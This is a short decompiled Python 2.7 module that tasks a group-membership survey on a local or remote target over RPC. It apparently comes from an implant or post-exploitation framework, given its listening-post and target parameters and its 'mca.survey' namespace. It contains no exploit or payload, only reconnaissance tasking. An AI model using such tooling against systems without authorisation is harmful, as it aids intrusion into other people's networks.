# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Groups_Tasking.py
GROUP_TYPE_LOCAL = 1
GROUP_TYPE_NETWORK = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.groups', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.groups.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.groups.Params()
    if lpParams['type'] == GROUP_TYPE_LOCAL:
        tgtParams.groupType = mca.survey.cmd.groups.PARAMS_GROUP_TYPE_LOCAL
    elif lpParams['type'] == GROUP_TYPE_NETWORK:
        tgtParams.groupType = mca.survey.cmd.groups.PARAMS_GROUP_TYPE_NETWORK
    if lpParams['userName'] != None:
        tgtParams.user = lpParams['userName']
    if lpParams['serverName'] != None:
        tgtParams.target = lpParams['serverName']
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    if len(tgtParams.user) > 0:
        taskXml.AddSearchMask(tgtParams.user)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.survey.cmd.groups.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.groups.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)